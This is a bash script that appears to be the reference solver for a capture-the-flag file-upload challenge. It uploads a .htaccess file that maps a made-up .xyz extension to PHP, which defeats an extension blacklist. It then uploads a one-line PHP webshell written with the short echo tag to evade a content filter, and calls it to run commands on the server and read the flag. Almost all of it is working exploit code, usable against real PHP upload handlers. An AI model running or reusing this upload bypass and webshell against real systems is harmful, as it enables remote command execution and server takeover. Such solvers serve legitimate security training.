#!/usr/bin/env bash
# 06 · upload-htaccess (v2) reference solver
#
# Two layers to break:
#   1) Extension blacklist (php/phtml/phar/...) misses .htaccess and invented
#      extensions. Upload a .htaccess that maps an innocent extension to PHP.
#   2) A content filter rejects any upload containing the literal `<?php`, so a
#      normal webshell is blocked. Bypass it with PHP's short-echo tag `<?=`,
#      which is always enabled in PHP 8 and never contains `<?php`.
#
# Usage: ./solve.sh http://TARGET:PORT
set -euo pipefail
BASE="${1:?usage: solve.sh http://host:port}"
TMP="$(mktemp -d)"

# 1) .htaccess: re-map .xyz to the PHP handler for this directory.
cat > "${TMP}/.htaccess" <<'EOF'
AddType application/x-httpd-php .xyz
EOF

# 2) webshell with NO `<?php` token -- short echo tag bypasses the content filter.
cat > "${TMP}/shell.xyz" <<'EOF'
<?=shell_exec($_GET["c"])?>
EOF

echo "[*] Uploading .htaccess..."
curl -s -F "file=@${TMP}/.htaccess;filename=.htaccess" "${BASE}/" >/dev/null

echo "[*] Uploading shell.xyz (short-tag webshell)..."
curl -s -F "file=@${TMP}/shell.xyz;filename=shell.xyz" "${BASE}/" >/dev/null

echo "[*] Triggering the webshell..."
curl -s -G "${BASE}/uploads/shell.xyz" --data-urlencode "c=cat /flag.txt" \
  | grep -oE 'SecurinetsENIT\{[^}]+\}' | head -n1

rm -rf "${TMP}"
